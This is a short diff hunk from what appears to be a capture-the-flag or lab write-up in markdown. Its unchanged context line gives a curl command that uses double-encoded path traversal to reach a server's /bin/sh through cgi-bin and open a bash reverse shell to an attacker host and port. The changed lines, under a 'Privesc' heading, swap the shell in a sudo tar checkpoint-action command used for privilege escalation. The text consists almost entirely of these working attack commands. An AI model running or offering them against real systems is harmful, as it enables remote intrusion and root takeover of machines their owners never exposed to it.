@@ -16,4 +16,4 @@
 `curl -s --path-as-is 'http://<IP>:4444/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; bash -c "/bin/sh -i >& /dev/tcp/<your host IP>/<your listener port> 0>&1"'`
 
 # Privesc
-`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
+`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`
